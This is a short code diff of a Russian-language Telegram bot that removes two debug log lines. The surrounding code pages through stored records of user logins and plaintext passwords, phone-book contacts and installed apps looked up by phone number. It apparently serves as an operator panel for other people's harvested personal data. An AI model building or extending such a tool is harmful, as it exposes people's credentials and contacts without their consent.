@@ -31,7 +31,6 @@ bot.onText(/Просмотреть отработанные номера/, async
         const user_password = `Пароль ${element.password}`
         return `${user_id}\n${user_login}\n${user_password}`;
     })
-    console.log(userMessages)
     const messagesToSendusers = userMessages;
     const pageSizeusers = 7;
     const totalPagesusers = Math.ceil(messagesToSendusers.length / pageSizeusers);
@@ -131,7 +130,6 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             const phones = `Номера: ${element.phoneNumbers.map(phone => phone.number).join(', ')}`;
                             return `Телефонная книга\n${name}\n${phones}`;
                         });
-                        console.log(contactMessages)
                         databtns.push({ text: "Контакты", callback_data: "Sendcontacts" })
                     }
                     if (userdataByPhone.data?.userApps[0]) {
